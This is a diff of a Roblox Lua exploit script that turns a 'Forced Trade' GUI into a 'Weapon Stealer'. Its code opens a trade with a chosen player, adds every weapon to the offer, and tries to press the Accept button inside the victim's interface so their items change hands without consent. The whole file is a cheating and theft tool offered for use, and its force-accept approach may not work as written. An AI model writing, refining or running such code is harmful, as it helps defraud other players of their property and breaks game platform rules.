@@ -1,90 +1,174 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-
-wait(1)
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local function findPlayerByName(name)
 	return Players:FindFirstChild(name)
 end
 
-local function findPlayerInGui(targetPlayer)
-	for _, obj in pairs(PlayerGui:GetDescendants()) do
-		if (obj:IsA("GuiButton") or obj:IsA("TextLabel")) and obj.Text:match(targetPlayer.Name) then
+local function findButtonByText(text, parent)
+	for _, obj in pairs(parent:GetDescendants()) do
+		if obj:IsA("GuiButton") and obj.Text:match(text) then
 			return obj
 		end
 	end
 	return nil
 end
 
-local function addAllWeapons()
-	for _, obj in pairs(PlayerGui:GetDescendants()) do
-		if obj:IsA("GuiButton") and (obj.Name:match("[Ii]tem") or obj.Name:match("[Ww]eapon")) then
-			obj:Activate()
-			task.wait(0.1)
+local function findObjectByText(text, parent)
+	for _, obj in pairs(parent:GetDescendants()) do
+		if (obj:IsA("GuiButton") or obj:IsA("TextLabel")) and obj.Text:match(text) then
+			return obj
 		end
+	end
+	return nil
+end
+
+local function clickWeaponsCategory()
+	print("🟡 Looking for Weapons category button...")
+	task.wait(0.5)
+	
+	local weaponsBtn = findButtonByText("Weapons", PlayerGui)
+	if weaponsBtn then
+		print("✅ Found Weapons button, clicking...")
+		weaponsBtn:Activate()
+		task.wait(1)
+		return true
+	else
+		print("❌ Weapons button not found")
+		return false
 	end
 end
 
-local function forceAcceptTrade(targetPlayer)
-	local targetPlayerGui = targetPlayer:WaitForChild("PlayerGui")
-	task.wait(0.3)
+local function addAllWeaponsToOffer()
+	print("📦 Adding all weapons from their inventory...")
+	task.wait(0.5)
 	
-	for _, obj in pairs(targetPlayerGui:GetDescendants()) do
+	local addedCount = 0
+	for _, obj in pairs(PlayerGui:GetDescendants()) do
 		if obj:IsA("GuiButton") then
-			local name = obj.Name:lower()
 			local text = obj.Text:lower()
-			if name:match("accept") or name:match("confirm") or text:match("accept") or text:match("confirm") then
-				obj:Activate()
-				break
+			-- Look for "+" buttons or "Add" buttons on weapon items
+			if text:match("^%+$") or text:match("add") then
+				local parent = obj.Parent
+				if parent and parent.Name:match("[Ww]eapon") then
+					print("Adding weapon: " .. obj.Name)
+					obj:Activate()
+					addedCount = addedCount + 1
+					task.wait(0.2)
+				end
 			end
 		end
 	end
+	
+	print("✅ Added " .. addedCount .. " weapons")
+	return addedCount > 0
 end
 
 local function acceptTrade()
+	print("✅ Accepting trade...")
 	task.wait(0.5)
+	
+	local acceptBtn = findButtonByText("Accept", PlayerGui)
+	if acceptBtn then
+		print("✅ Clicking Accept button...")
+		acceptBtn:Activate()
+		task.wait(1)
+		return true
+	else
+		print("❌ Accept button not found")
+		return false
+	end
+end
+
+local function forceAcceptOnTarget(targetPlayer)
+	print("🔄 Forcing acceptance on target player...")
+	
+	task.spawn(function()
+		local targetGui = targetPlayer:WaitForChild("PlayerGui")
+		task.wait(1)
+		
+		for i = 1, 10 do
+			for _, obj in pairs(targetGui:GetDescendants()) do
+				if obj:IsA("GuiButton") and obj.Text:match("Accept") then
+					print("✅ Force accepting on target player...")
+					obj:Activate()
+					return
+				end
+			end
+			task.wait(0.3)
+		end
+	end)
+end
+
+local function stealWeaponsTrade(targetPlayer)
+	if not targetPlayer or targetPlayer == LocalPlayer then
+		print("❌ Invalid target player")
+		return false
+	end
+	
+	print("🎯 Starting forced weapons trade with " .. targetPlayer.Name .. "...")
+	
+	-- Find and click their Trade button
+	print("🔍 Looking for Trade button for " .. targetPlayer.Name .. "...")
+	task.wait(0.3)
+	
+	local tradeBtn = nil
 	for _, obj in pairs(PlayerGui:GetDescendants()) do
-		if obj:IsA("GuiButton") then
-			local name = obj.Name:lower()
-			local text = obj.Text:lower()
-			if name:match("accept") or name:match("confirm") or text:match("accept") or text:match("confirm") then
-				obj:Activate()
+		if obj:IsA("GuiButton") and obj.Text:match("Trade") then
+			-- Check if this is the right player's Trade button
+			local found = false
+			for _, sibling in pairs(obj.Parent:GetChildren()) do
+				if sibling:IsA("TextLabel") and sibling.Text:match(targetPlayer.Name) then
+					found = true
+					break
+				end
+			end
+			if found then
+				tradeBtn = obj
 				break
 			end
 		end
 	end
-end
-
-local function forcedTrade(targetPlayer)
-	if not targetPlayer or targetPlayer == LocalPlayer then return false end
-	local playerBtn = findPlayerInGui(targetPlayer)
-	if playerBtn then
-		playerBtn:Activate()
-		task.wait(0.5)
-		addAllWeapons()
-		task.wait(0.3)
-		
-		task.spawn(function()
-			forceAcceptTrade(targetPlayer)
-		end)
-		
-		task.wait(0.3)
-		acceptTrade()
-		return true
+	
+	if not tradeBtn then
+		print("❌ Could not find Trade button for " .. targetPlayer.Name)
+		return false
 	end
-	return false
+	
+	print("✅ Found Trade button, clicking...")
+	tradeBtn:Activate()
+	task.wait(2)
+	
+	-- Click Weapons category
+	if not clickWeaponsCategory() then
+		print("⚠️ Could not click Weapons category")
+	end
+	
+	-- Add all weapons
+	task.wait(0.5)
+	addAllWeaponsToOffer()
+	
+	-- Force accept on target
+	task.wait(0.5)
+	forceAcceptOnTarget(targetPlayer)
+	
+	-- Accept on our side
+	task.wait(1)
+	acceptTrade()
+	
+	print("✅ Trade process complete!")
+	return true
 end
 
+-- Create GUI
 print("Creating GUI...")
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ForcedTradeGui"
+screenGui.Name = "WeaponThiefGui"
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 999
 screenGui.Parent = PlayerGui
-
-print("GUI Created, adding elements...")
 
 local frame = Instance.new("Frame")
 frame.Name = "MainFrame"
@@ -99,12 +183,12 @@ local titleLabel = Instance.new("TextLabel")
 titleLabel.Name = "Title"
 titleLabel.Size = UDim2.new(1, 0, 0, 30)
 titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+titleLabel.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
 titleLabel.BackgroundTransparency = 0.3
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 titleLabel.TextSize = 16
 titleLabel.Font = Enum.Font.GothamBold
-titleLabel.Text = "FORCED TRADE"
+titleLabel.Text = "STEAL WEAPONS"
 titleLabel.BorderSizePixel = 0
 titleLabel.Parent = frame
 
@@ -126,12 +210,12 @@ local button = Instance.new("TextButton")
 button.Name = "TradeBtn"
 button.Size = UDim2.new(0.9, 0, 0, 35)
 button.Position = UDim2.new(0.05, 0, 0, 75)
-button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+button.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
 button.BackgroundTransparency = 0.2
 button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.TextSize = 16
 button.Font = Enum.Font.GothamBold
-button.Text = "TRADE"
+button.Text = "STEAL"
 button.BorderSizePixel = 0
 button.Parent = frame
 
@@ -142,8 +226,10 @@ button.MouseButton1Click:Connect(function()
 	
 	if playerName == "" or playerName == nil then
 		button.Text = "ENTER NAME"
-		task.wait(2)
-		button.Text = "TRADE"
+		button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+		task.wait(1.5)
+		button.Text = "STEAL"
+		button.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
 		return
 	end
 	
@@ -151,16 +237,32 @@ button.MouseButton1Click:Connect(function()
 	
 	if not target then
 		button.Text = "NOT FOUND"
-		task.wait(2)
-		button.Text = "TRADE"
+		button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+		task.wait(1.5)
+		button.Text = "STEAL"
+		button.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
 		return
 	end
 	
-	button.Text = "TRADING..."
-	forcedTrade(target)
-	task.wait(2)
-	button.Text = "TRADE"
+	button.Text = "STEALING..."
+	button.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+	
+	local success = stealWeaponsTrade(target)
+	
+	task.wait(0.5)
+	if success then
+		button.Text = "SUCCESS!"
+		button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+		task.wait(2)
+	else
+		button.Text = "FAILED"
+		button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+		task.wait(2)
+	end
+	
+	button.Text = "STEAL"
+	button.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
 end)
 
-_G.ForcedTrade = forcedTrade
-print("✅ Script loaded! GUI should be visible at top.")
+_G.StealWeapons = stealWeaponsTrade
+print("✅ Weapon Stealer loaded! Enter username and click STEAL button.")
